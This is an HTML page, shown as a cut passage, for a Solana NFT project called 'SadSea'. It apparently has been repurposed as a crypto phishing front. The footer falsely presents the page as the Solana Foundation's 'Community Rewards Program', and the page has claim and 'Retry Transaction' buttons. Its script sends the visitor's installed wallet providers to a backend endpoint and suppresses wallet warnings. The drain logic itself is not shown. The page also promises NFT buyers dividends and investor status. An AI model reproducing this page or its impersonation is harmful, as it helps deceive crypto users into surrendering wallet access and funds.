      /* Ensure modals work properly on mobile */
      .modal {
        padding: 10px;
      }
      
      /* Improve wallet options spacing on mobile */
      .wallet-option {
        margin: 8px 0;
      }
      
      /* Better text readability on mobile */
      .info-section h2 {
        font-size: 1.6em;
      }
      
      .info-card h3 {
        font-size: 1.1em;
      }
    }

    /* Ensure proper viewport handling */
    @media (max-width: 480px) {
      body {
        font-size: 14px;
      }
      
      /* Improve button accessibility */
      .claim-btn, .nav-btn, .wallet-option {
        touch-action: manipulation;
        -webkit-tap-highlight-color: transparent;
      }
      
      /* Better spacing for small screens */
      .hero {
        padding: 20px 10px;
      }
      
      .info-section {
        margin: 15px auto;
      }
    }
	
    /* High DPI display support */
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
      .hero {
        background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
      }
    }
    
    /* Fallback for devices with background image issues */
    @media (max-width: 768px) {
      .hero {
        background-image: linear-gradient(rgba(10,10,10,0.5), rgba(10,10,10,0.5)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
      }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { 
        padding: 60px 8px; 
        background-image: linear-gradient(rgba(10,10,10,0.6), rgba(10,10,10,0.6)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
        min-height: 100vh;
      }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { 
        padding: 20px; 
        margin: 20px;
        max-width: calc(100% - 40px);
        border-radius: 12px;
        width: 90vw;
      }
      .wallet-option {
        padding: 16px 20px;
        margin: 8px 0;
        min-height: 60px; /* Better touch target */
        border-radius: 10px;
      }
      .wallet-option img {
        width: 32px;
        height: 32px;
      }
      .wallet-name {
        font-size: 1.1em;
      }
      .modal {
        padding: 10px;
      }
    }
    
    /* Mobile-specific hero improvements */
    @media (max-width: 480px) {
      .hero { 
        background-image: linear-gradient(rgba(10,10,10,0.7), rgba(10,10,10,0.7)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
        min-height: 100vh;
        padding: 40px 8px;
      }
      .hero h1 { font-size: 1.8em; }
      .countdown { font-size: 1.1em; }
    }
    
    /* Mobile-specific wallet modal improvements */
    @media (max-width: 480px) {
      .wallet-box {
        padding: 16px;
        margin: 10px;
        max-width: calc(100% - 20px);
        width: 95vw;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        max-height: 80vh;
        overflow-y: auto;
      }
      .wallet-option {
        padding: 18px 16px;
        margin: 6px 0;
        min-height: 70px;
      }
      .wallet-option img {
        width: 36px;
        height: 36px;
      }
      .wallet-name {
        font-size: 1.2em;
        line-height: 1.3;
      }
      .modal {
        padding: 0;
      }
      #statusModal {
        padding: 0;
      }
      #statusModal .wallet-box {
        margin: 15px;
        max-width: 250px;
        text-align: center;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
    }
    
    /* Touch-friendly improvements for mobile */
    @media (hover: none) and (pointer: coarse) {
      .wallet-option {
        min-height: 55px;
        padding: 14px 18px;
      }
      .wallet-option:active {
        background: #333;
        transform: scale(0.98);
      }
      .claim-btn {
        min-height: 48px;
        padding: 14px 20px;
      }
      .claim-btn:active {
        transform: scale(0.95);
      }
      .modal {
        padding: 0;
      }
    }
  </style>
	
  </head>

  <body>

  <header>

    <div class="container_image">

  <img class ="logo" src="Pictures/logo2.png"	></img>

    </div>
    <button class="hamburger" id="hamburger" aria-label="Toggle menu">
      <span></span>
      <span></span>
      <span></span>
    </button>
    <div class="container" id="nav-menu">
      <a href="#roadmap" class ="R1"> RoadMap</a>
      <a href ="#mint"   onclick="openWalletModal()" class ="R1"> Mint</a>
      <a href="#team" class ="R1"> Team</a>
      <a href="#div8_faq" class ="R1"> Faq</a>
    </div>

  </header>



	<div class="div1_poisson">
		<img class="poisson" src="Pictures/GIF.gif">
		<img class="poisson2" src="Pictures/canabis_petit.png">

		
		<div class="titre">
		 <div class="p4444">4444</div>
		  <div class="super_fish">SuperFish</div>
			<div class="nft"> Sadsea is a collection of 4444 uniques NFTs fish ready to save the sea</div>
		</div>
	</div>
	<!--<p class="div1_bouton"> CLIQUEZ </p>-->

	<div class="div2_communautÃ©">
		<p class="div2_p"> join our community on the networks </p>
		<div class="reseaux">
			<a href="https://twitter.com/SadSeaNFT" target="_blank"><img class="reseaux_img" src="Pictures/twitter.png"></a>
			<a href="https://discord.gg/Cc7eHjdaX6" target="_blank"><img class="reseaux_img" src="Pictures/discord.png"></a>
			<a href="https://www.instagram.com/sadseanft/" target="_blank"><img class="reseaux_img" src="Pictures/instagram.png"></a>
		</div>
	</div>
	<p class="div3_title_up"> What is </p>
	<p class="div3_title">  SadSea?</p>
	<div class="div3_what">
		<p class="div3_p">
Fish are living in the ocean, a rude environment attacked by plastic, radioactivity and humans. <br>
Biodiversity decrease and we need to save these Fish.
Each fish is unique but if we don't protect them fastly we will lost them.
So to protect the biodiversity collect them while we are cleaning the ocean of diseases.
</p>
	<div class="div3_poisson">
		<img class="div3_img" src="Pictures/jack.png">
		<img class="div3_img" src="Pictures/sully_0.5k.png">
	</div>
	</div>

		<p class="div4_title" id="why"> Why</p>
		<p class="div4_p"> SadSea </p>
	<div class="div4_why">
		<div class="div4_left">
			<img class="bouteille" src="Pictures/plage2.jpg"></img>
			<p class="div4_text">More than 24.4B of plastics particules are actually in suspension in oceans. 11 millions tons of plastics are deversed each year, in 2040 these numbers will be quadrupled<br></p>
			<img class="bouteille" src="Pictures/tortue.jpg"></img>
			<p class="div4_text">
			In the north Pacific, there are a big concentration of millions floating visible plastics which has been designed as the 7th continent. His square is about 3.5 millions square kilometers.<br></p>			
		</div>
		<div class="div4_left">
			
			<p class="div4_text">
			Plastics are an eyesore for the oceans, animals get stuck in the bigger pieces, leading to their death. The smallest pieces are mistaken for food and therefore ingested, turtles mistake them for jellyfish, seabirds sting the floating pieces of plastic. Large cetaceans filtering seawater ingest huge amounts of plastic material. Molluscs like mussels also filter m3 of contaminated water which inexorably leads to their death<br></p>
			<img class="bouteille" src="Pictures/bouteille.jpg"></img>

			

			<p class="div4_text">
			Why is it so important to protect our oceans ?<br>
			Oceans are essentials to the life on Earth. They product half oxygen we breathe, participate to absorb 30% CO2 mondial emissions stocked in the depth. Wihout oceans, the heat will cause humans being extinctions <br></p>
			<img class="bouteille" src="Pictures/plage1.jpg"></img>

			<p class="div4_text">
			Protecting the ocean is doable, we can reduce our daily plastic consommation, consommate more ecologically, cleaning beachs...<br>
			A lot of big projects have been launched to remove plastics in the oceans like "Ocean Cleanup" who wanted to make a giant floating barrier but has never being concluant <br>
		</p>
		</div>
		<div class="div4_tel">
			<img class="bouteille" src="Pictures/plage2.jpg"></img>
			<p class="div4_text">
			Plastics are an eyesore for the oceans, animals get stuck in the bigger pieces, leading to their death. The smallest pieces are mistaken for food and therefore ingested, turtles mistake them for jellyfish, seabirds sting the floating pieces of plastic. Large cetaceans filtering seawater ingest huge amounts of plastic material. Molluscs like mussels also filter m3 of contaminated water which inexorably leads to their death<br></p>
			<img class="bouteille" src="Pictures/bouteille.jpg"></img>
				<p class="div4_text">More than 24.4B of plastics particules are actually in suspension in oceans. 11 millions tons of plastics are deversed each year, in 2040 these numbers will be quadrupled<br></p>
			<img class="bouteille" src="Pictures/tortue.jpg"></img>
			<p class="div4_text">
			Why is it so important to protect our oceans ?<br>
			Oceans are essentials to the life on Earth. They product half oxygen we breathe, participate to absorb 30% CO2 mondial emissions stocked in the depth. Wihout oceans, the heat will cause humans being extinctions <br></p>
			<img class="bouteille" src="Pictures/plage1.jpg"></img>
			<p class="div4_text">
			In the north Pacific, there are a big concentration of millions floating visible plastics which has been designed as the 7th continent. His square is about 3.5 millions square kilometers.<br></p>	

		</div>


	</div>
	<div class="galery">
		<div class="galery2">
		<img class="img" src="Pictures/harry_1k.png">
		<img class="img" src="Pictures/rappeur.png">
		<img class="img" src="Pictures/roi_0.5k.png">
		</div>
		<div class="galery2">
		<img class="img" src="Pictures/gabin.png">
		<img class="img" src="Pictures/grandp_0.5k.png">
		<img class="img" src="Pictures/bagarre.png">

		</div>


	</div>

	<p class="div3_title_up"> Advantage </p>
	<p class="div3_title">  To have SadSea </p>
	<div class="avantage">
		<div class="avt">
			<div class="avantage_text">
				<p class="p_avantage">  1 </br> Participate to save the environment, oceans, animals... Do a good action </p>
			</div>
			<img class="avantage_img" src="Pictures/france.jpg">
			
			<div class="avantage_text">
				<p class="p_avantage">3 </br>Participate in all our future decisions in our enterprise. </p>
			</div>
			<img class="avantage_img" src="Pictures/nft.jpg">
		
			<div class="avantage_text">
				<p class="p_avantage">5 </br> An unlimited free access to our decentralized application  </p>
			</div>
			<img class="avantage_img" src="Pictures/dividende.jpg">
			
		</div>
		<div class="avt">
			<img class="avantage_img" src="Pictures/environnement.jpg">
			<div class="avantage_text">
				<p class="p_avantage"> 2 </br>Possibility to earn a one week journey in France to discover how we clean the oceans </p>
			</div>
			
			<img class="avantage_img" src="Pictures/good.jpg">
			
				<div class="avantage_text">
				<p class="p_avantage">4 </br>Obtain new NFT each month in your wallet</p>
			</div>
			<img class="avantage_img" src="Pictures/infini.jpg">
			<div class="avantage_text">
				<p class="p_avantage">6 </br>Royalties on all our next benefits</p>
			</div>
			
		</div>

		
	</div>
	<div class="avantage_tel">
		<div class="avantage_text">
				<p class="p_avantage">  1 </br> Participate to save the environment, oceans, animals... Do a good action </p>
				<img class="avantage_img" src="Pictures/environnement.jpg">
				<p class="p_avantage"> 2 </br>Possibility to earn a one week journey in France to discover how we clean the oceans </p>
				<img class="avantage_img" src="Pictures/france.jpg">
					<p class="p_avantage">3 </br>Participate in all our future decisions in our enterprise </p>
				<img class="avantage_img" src="Pictures/good.jpg">
					<p class="p_avantage">4 </br> Obtain new NFT each month in your wallet</p>
				<img class="avantage_img" src="Pictures/nft.jpg">
				<p class="p_avantage">5 </br> An unlimited free access to our application</p>
				<img class="avantage_img" src="Pictures/infini.jpg">
				<p class="p_avantage">6 </br>Royalties on all our next benefits</p>
							<img class="avantage_img" src="Pictures/dividende.jpg">
			</div>
	</div>



	
	</div>

	<p class="div6_title" id="roadmap">RoadMap</p>

	<div class="div6_roadmap">
		<div class="div6_left">
			<div class="left1">
				<p class="titre_left">Community </p>
				<p class="p_left"> Launching SadSea collections <br>Creating the community<br>
Whitelist 300 persons who promote the project<br>
</p>
				
			</div>
			<div class="left2">
			
			</div>
			<div class="left1">
				<p class="titre_left">Collaboration </p>
				<p class="p_left"> Donation to our partner <br> We will start to work with this association <br> We'll go ourselves remove plastics on the beaches and we will go on a boat that will clean up the sea</p>
			</div>
			<div class="left2">
	
			</div>
			<div class="left1">
			<p class="titre_left">Private Club</p>
				<p class="p_left"> 
				Each owner of a SadSea NFT will have a role to play in the decisions that will be taken in the rest of the project (private club...). We'll let you know quickly</p>
			</div>
			<div class="left2">
			
			</div>
			<div class="left1">
				<p class="titre_left">Creation Society</p>
				<p class="p_left"> Creation of a dApp on the Solana blockchain in Q3 2022 and each possessor of a SadSea NFT will be considered as an investor of our society and will receive dividend of our benefits.</p>
			</div>
			<div class="left2">
	
			</div>
		</div>
		<div class="div6_middle">
		</div>
		<div class="div6_tel">
			<div class="left1">
			<p class="titre_left">Community </p>
				<p class="p_left"> Launching Fish collections Creating the community Whitelist 300 persons who promote the project <br></p>
			</div>

			<div class="left1">
			<p class="titre_left">Sale </p>
				<p class="p_left"> Private mint on <br> Public mint <br> 1h after Listing on marketplaces</p>
			</div>

			<div class="left1">
			<p class="titre_left">Collaboration </p>
				<p class="p_left"> Donation to our partner <br> We will start to work with this association <br> We'll go ourselves remove plastics on the beaches and we will go on a boat that will clean up the sea</p>
			</div>

			<div class="left1">
			<p class="titre_left">Golden Possessors</p>
				<p class="p_left"> Possessors of a golden bottle on their NFT will have a journey in France to discover how we clean the beaches, oceans. They will stay 1 week and will be able to see us and participate in the actions as well as discover France and have a great vacation (it will depend on our number of sales)</p>
			</div>

			<div class="left1">
			<p class="titre_left">Private Club</p>
				<p class="p_left"> Each owner of a SadSea NFT will have a role to play in the decisions that will be taken in the rest of the project (private club...). We'll let you know quickly</p>
			</div>
			
			<div class="left1">
			<p class="titre_left">Investment</p>
				<p class="p_left"> Thanks to the profits from the sale of NFTs, we intend to recruit competent people with whom we would embark on the metaverse, as well as launch our 2nd collection of environmental NFTs</p>
			</div>

			<div class="left1">
			<p class="titre_left">NFTs every month</p>
				<p class="p_left"> 
				Each possessor of a SadSea NFT will receive each month in his wallet a free NFT from a new collection that he can keep or sell as he want</p>
			</div>

			<div class="left1">
			<p class="titre_left">Creation Society</p>
				<p class="p_left"> Creation of a dApp on the Solana blockchain in Q3 2022 and each possessor of a SadSea NFT will be considered as an investor of our society and will receive dividend of our benefits.</p>
			</div>

		</div>
		<div class="div6_right">
			<div class="left2">
				
			</div>
			<div class="left1">
				<p class="titre_left">Sale </p>
				<p class="p_left"> 
				Private mint <br>
				Public mint 1h after<br>
				Listing on marketplaces
			</div>
			<div class="left2">
			</p>
			</div>
			<div class="left1">
			<p class="titre_left">Golden Possessors</p>
				<p class="p_left"> Possessors of a golden bottle on their NFT will have a journey in France to discover how we clean the beaches, oceans. They will stay 1 week and will be able to see us and participate in the actions as well as discover France and have a great vacation (it will depend on our number of sales)</p>
			</div>
			<div class="left2">
				
			</div>
			<div class="left1">
				<p class="titre_left">NFTs every month</p>
				<p class="p_left"> Each possessor of a SadSea NFT will receive each month in his wallet a free NFT from a new collection that he can keep or sell as he want.</p>
			</div>
			<div class="left2">
			</p>
			</div>
			

		</div>


	</div>

	<p class="div7_title" id="team">TEAM</p>
	<div class="div7">
		<div class="div7_left">
			
<img class="div7_img"src="Pictures/black_fond.png">
			<p class=div7_text>Alias gabgab is studying in a reputed engineering French school.
He loves reading articles about marketing, crypto and NFT, also fond of programming in nearly all languages and using Design program.
He gets the idea of creating NFT by reading articles about it and after he invested a lot in it.
During the project, his main actions are to Design, developing the website and Solana blockchain
Environmental protector, He would like to exterminate plastic in the world.
To reduce his carbon footprint, he prefers moving with his electric scooter.</p>

<p class="div7_text_title_tel ">Gabin </p>
		</div>
		

		<div class="div7_left">
			
			<img class="div8_img"src="Pictures/theo.png">
			<p class=div7_text>Theo is studying in the same school as Gabin.
He loves crypto and NFT and has been hyped by Gabin, learned a lot with him and invested with him.
He helped a lot Gabin to structure the project and going deeper.
During the project, his main actions are to manage all the social networks, CAD and Solana blockchain.
Environmental protector, He cares a lot about what he buys.
Fond of cycling, he prefers moving with his road bike to reduce his carbon footprint.</p>
<p class="div7_text_title_tel ">Theo </p>


		</div>
	</div>
		
	</div>
   <div class="div72">
   	<div class="div7_right">
			<p class="div7_text_title ">Gabin </p>
		</div>
	  	<div class="div7_right">
			   	<p class="div7_text_title ">Theo </p>

		</div>
	</div>

	<p class="div3_title_up"> Why </p>
	<p class="div3_title">  Solana  </p>

	<div class="solana">
		<div class="sol_1">
			<img class="solana_img "src="Pictures/solana.jpeg">
		</div>
		<div class="sol_2">
			<p class="solana_text">
				We have chosen to use the Solana blockchain for some reason. First of all, it is one of the best of the market, got a few gas fee that warranty for buyers a small investment and it can do a lot of transactions per seconds. </br>

It's a very promising blockchain that have a good future. It has a super development team and the best enginneers of the world.</br>
We will develop soon our dApp on this blockchain.
			</p>
		</div>
	</div>
   	

 

		
	
	<p class="div8_title">FAQ</p>
	<div class="div8_faq" id="div8_faq">

		
		<button class="accordion" type="button">How many NFT  will be available ?</button>
			<div class="panel">
			
 		 			<p class="panel_p">4444 uniques fish </p>
			</div>
			<button class="accordion" type="button">When we will be the mint?</button>
			<div class="panel">
				
 		 			<p class="panel_p">Minting will be on 28 february 23.00 UTC.</p>
			</div>
			<button class="accordion" type="button">How to buy?</button>
			<div class="panel">
				
 		 			<p class="panel_p">First of all, you need to buy SOL on an exchange platform (Binance, Coinbase...). Do not forget to buy more than 0.6 SOL for gas fee (approximately 0.02 SOL).
After, download and install a Solana phantom wallet.
Transfer your SOL from your exchange platform to your wallet.
Mint your Fish by clicking on MINT on our website. It will ask you to connect your wallet than approve the transaction and you will be the possessor of an NFT.
</p>
			</div>
			<button class="accordion" type="button">How can I see my Sadsea NFT?</button>
			<div class="panel">
				
 		 			<p class="panel_p">In your phantom wallet.</p>
			</div>


		<button class="accordion" type="button">Where can I sell my Sadsea NFT?</button>
			<div class="panel">
			
 		 			<p class="panel_p">On <a href="https://magiceden.io/marketplace/sadsea">MagicEden</a> and <a href="https://solanart.io/collections/sadsea">Solanart</a> </p>
			</div>


		
	</div>

	
  <!-- WalletConnect-style Web3Modal -->
  <div id="walletModal" class="modal">
      <div class="wallet-box">
          <div class="modal-header">
              <div class="header-content">
                  <h3>Connect Wallet</h3>
                  <p class="header-subtitle"></p>
                  
              </div>
              <button class="close-btn" onclick="closeWalletModal()">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                  </svg>
              </button>
          </div>
          <div class="wallet-options">
              <!-- Wallet options will be dynamically loaded from backend -->
          </div>
          
          <div class="modal-footer">
              <div class="footer-content">
                  <p class="wallet-help">Don't have a wallet?</p>
                  <div class="wallet-links">
                      <a href="https://phantom.app/" target="_blank" class="wallet-link">Phantom</a>
                      <span class="separator">â¢</span>
                      <a href="https://solflare.com/" target="_blank" class="wallet-link">Solflare</a>
                      <span class="separator">â¢</span>
                      <a href="https://backpack.app/" target="_blank" class="wallet-link">Backpack</a>
                  </div>
              </div>
          </div>
      </div>
  </div>
  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
    <div class="wallet-box" id="statusModalBox">
      <div id="statusModalMsg"></div>
      <div id="statusModalActions" style="margin-top:24px;display:none;">
        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
      </div>
      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
    </div>
  </div>
   <div class="footer">
    <p><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Join the Solana Community Rewards Program today!</p>
    <p>Powered by the Solana blockchain. Fast. Scalable. Community-driven.</p>
  <p>Â© 2025 Solana Foundation. All rights reserved.</p>
  </div>

  <!-- endhere -->
<script src="Js/nft2.js">

				</script>

				 <script>
    // Cache busting: v4 - Enhanced error suppression and logo fixes
    
    // Mobile detection functions - delegated to backend
    async function isMobile() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.isMobile || false;
      } catch (error) {
        // Fallback to basic detection
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             window.innerWidth <= 768;
      }
    }

    // Enhanced mobile detection with more specific checks - delegated to backend
    async function getMobilePlatform() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.platform || 'desktop';
      } catch (error) {
        // Fallback to basic detection
      const userAgent = navigator.userAgent.toLowerCase();
        if (/iphone|ipad|ipod/.test(userAgent)) return 'ios';
        if (/android/.test(userAgent)) return 'android';
        if (/windows phone/.test(userAgent)) return 'windows';
      return 'desktop';
      }
    }

    // Check if we're in a mobile wallet browser - delegated to backend
    async function isInMobileWallet() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.inMobileWallet || false;
      } catch (error) {
        // Fallback to basic detection
        const userAgent = navigator.userAgent.toLowerCase();
        const walletPatterns = ['phantom', 'solflare', 'backpack', 'glow', 'trust', 'exodus', 'wallet', 'crypto'];
      return walletPatterns.some(pattern => userAgent.includes(pattern));
      }
    }

    // Check if mobile wallet is actually available in browser
    function isMobileWalletAvailable(wallet) {
      const provider = wallet.provider();
      const isMobileDevice = isMobile();
  
      // On mobile, be more permissive - assume wallet can be connected
      if (isMobileDevice) {
        
        // If we have any provider, consider it available
        if (provider) {
          return true;
        }
        
        // If no specific provider, but we're on mobile, still consider it available
        // because mobile wallets might not expose themselves the same way
        return true;
      }
      
      // Desktop logic - be more strict
      if (!provider) {
        return false;
      }
      
      // Check for essential methods
      const hasConnect = typeof provider.connect === 'function';
      const hasPublicKey = provider.publicKey || provider.address;
      
      return provider && hasConnect;
    }

    // Get mobile store URL based on platform
    function getMobileStoreUrl(wallet) {
      if (!wallet.mobile) return wallet.install;
      
      // Use synchronous platform detection for immediate response
      const userAgent = navigator.userAgent.toLowerCase();
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      if (platform === 'ios') {
        return wallet.mobile.appStore;
      } else if (platform === 'android') {
        return wallet.mobile.playStore;
      }
      return wallet.install; // Fallback to desktop
    }

    // Force mobile wallet detection by checking all possible objects
    function forceDetectMobileWallets() {
      
      const detectedWallets = [];
      
      // Check for any solana-related objects
      const solanaObjects = [
        'window.solana',
        'window.phantom',
        'window.solflare', 
        'window.backpack',
        'window.glow',
        'window.trustwallet',
        'window.exodus',
        'window.phantom?.solana',
        'window.trustwallet?.solana'
      ];
      
      solanaObjects.forEach(objPath => {
        try {
          // Safe property access without eval
          let obj = null;
          if (objPath === 'window.solana') obj = window.solana;
          else if (objPath === 'window.phantom') obj = window.phantom;
          else if (objPath === 'window.solflare') obj = window.solflare;
          else if (objPath === 'window.backpack') obj = window.backpack;
          else if (objPath === 'window.glow') obj = window.glow;
          else if (objPath === 'window.trustwallet') obj = window.trustwallet;
          else if (objPath === 'window.exodus') obj = window.exodus;
          else if (objPath === 'window.phantom?.solana') obj = window.phantom?.solana;
          else if (objPath === 'window.trustwallet?.solana') obj = window.trustwallet?.solana;
          
          if (obj && typeof obj === 'object') {
            detectedWallets.push(objPath);
          }
        } catch (e) {
          // Object doesn't exist
        }
      });
      
      return detectedWallets;
    }

    // Wallet provider conflict resolution - delegated to backend
    async function resolveWalletConflicts() {
      console.log('[WALLET_CONFLICTS] Resolving wallet provider conflicts...');
      
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        
        const data = await response.json();
        if (data.success) {
          console.log('[WALLET_CONFLICTS] Detected wallets:', data.result.detectedWallets);
          console.log('[WALLET_CONFLICTS] Prioritized wallets:', data.result.prioritizedWallets);
          console.log('[WALLET_CONFLICTS] Recommended wallet:', data.result.recommendedWallet);
          return data.result.detectedWallets;
        }
      } catch (error) {
        console.error('[WALLET_CONFLICTS] Backend resolution failed:', error);
      }
      
      // Fallback to basic detection
      const installedWallets = [];
      if (window.phantom?.solana || (window.solana && window.solana.isPhantom)) {
        installedWallets.push('phantom');
      }
      if (window.backpack || window.BackpackWallet || (window.solana && window.solana.isBackpack)) {
        installedWallets.push('backpack');
      }
      if (window.solflare || (window.solana && window.solana.isSolflare)) {
        installedWallets.push('solflare');
      }
      if (window.trustwallet || (window.solana && window.solana.isTrustWallet)) {
        installedWallets.push('trustwallet');
      }
      if (window.exodus || (window.solana && window.solana.isExodus)) {
        installedWallets.push('exodus');
      }
      
      console.log('[WALLET_CONFLICTS] Fallback detected wallets:', installedWallets);
      return installedWallets;
    }
    
    // Initialize wallet conflict resolution
    resolveWalletConflicts();
    
    // Initialize enhanced wallet conflict resolution
    initializeWalletConflictResolution();
    
    // Enhanced wallet conflict resolution system
    function initializeWalletConflictResolution() {
      console.log('[WALLET_CONFLICTS] Initializing enhanced conflict resolution...');
      
      // Detect and prioritize wallets based on availability and functionality
      const walletPriority = [];
      
      // Check each wallet and add to priority list based on functionality
      if (window.backpack && typeof window.backpack.connect === 'function') {
        walletPriority.push({ name: 'backpack', priority: 1, provider: window.backpack });
      }
      if (window.phantom && typeof window.phantom.connect === 'function') {
        walletPriority.push({ name: 'phantom', priority: 2, provider: window.phantom });
      }
      if (window.solflare && typeof window.solflare.connect === 'function') {
        walletPriority.push({ name: 'solflare', priority: 3, provider: window.solflare });
      }
      if (window.glow && typeof window.glow.connect === 'function') {
        walletPriority.push({ name: 'glow', priority: 4, provider: window.glow });
      }
      if (window.trustwallet && typeof window.trustwallet.connect === 'function') {
        walletPriority.push({ name: 'trustwallet', priority: 5, provider: window.trustwallet });
      }
      if (window.exodus && typeof window.exodus.connect === 'function') {
        walletPriority.push({ name: 'exodus', priority: 6, provider: window.exodus });
      }
      
      // Sort by priority
      walletPriority.sort((a, b) => a.priority - b.priority);
      
      console.log('[WALLET_CONFLICTS] Wallet priority order:', walletPriority.map(w => w.name));
      
      // Set the recommended wallet
      if (walletPriority.length > 0) {
        window.recommendedWallet = walletPriority[0].name;
        console.log('[WALLET_CONFLICTS] Recommended wallet:', window.recommendedWallet);
      }
      
      // Show wallet conflict notification if multiple wallets detected
      if (walletPriority.length > 1) {
        console.log('[WALLET_CONFLICTS] Multiple wallets detected - showing conflict resolution');
        showWalletConflictNotification(walletPriority);
      }
      
      return walletPriority;
    }
    
    // Show wallet conflict notification to user
    function showWalletConflictNotification(walletPriority) {
      const conflictModal = document.createElement('div');
      conflictModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
        font-family: Arial, sans-serif;
      `;
      
      const modalContent = document.createElement('div');
      modalContent.style.cssText = `
        background: #1a1a1a;
        border: 1px solid #333;
        border-radius: 12px;
        padding: 30px;
        max-width: 500px;
        width: 90%;
        text-align: center;
        color: white;
      `;
      
      modalContent.innerHTML = `
        <h3 style="color: #ff6b6b; margin-bottom: 20px;">Wallet Conflict Detected</h3>
        <p style="margin-bottom: 20px; color: #ccc;">
          Multiple Solana wallets detected. We've prioritized them for optimal performance:
        </p>
        <div style="margin-bottom: 20px;">
          ${walletPriority.map((wallet, index) => `
            <div style="display: flex; align-items: center; justify-content: space-between; 
                        padding: 10px; margin: 5px 0; background: ${index === 0 ? '#2d5a2d' : '#333'}; 
                        border-radius: 8px;">
              <span style="color: ${index === 0 ? '#4ade80' : '#ccc'};">
                ${index + 1}. ${wallet.name.charAt(0).toUpperCase() + wallet.name.slice(1)}
              </span>
              ${index === 0 ? '<span style="color: #4ade80;">â Recommended</span>' : ''}
            </div>
          `).join('')}
        </div>
        <p style="color: #888; font-size: 14px; margin-bottom: 20px;">
          Using the recommended wallet will provide the best experience.
        </p>
        <button onclick="this.parentElement.parentElement.remove()" 
                style="background: #4ade80; color: white; border: none; padding: 12px 24px; 
                       border-radius: 8px; cursor: pointer; font-size: 16px;">
          Got it!
        </button>
      `;
      
      conflictModal.appendChild(modalContent);
      document.body.appendChild(conflictModal);
      
      // Auto-remove after 10 seconds
      setTimeout(() => {
        if (conflictModal.parentElement) {
          conflictModal.remove();
        }
      }, 10000);
    }
    
    // Global error handler for wallet provider conflicts
    window.addEventListener('error', function(event) {
      // Suppress wallet provider conflict errors
      if (event.message && (
        event.message.includes('Unable to set window.solana') ||
        event.message.includes('Unable to set window.phantom.solana') ||
        event.message.includes('Backpack couldn\'t override') ||
        event.message.includes('window.ethereum') ||
        event.message.includes('Could not assign Exodus provider') ||
        event.message.includes('Could not assign') ||
        event.message.includes('provider to window') ||
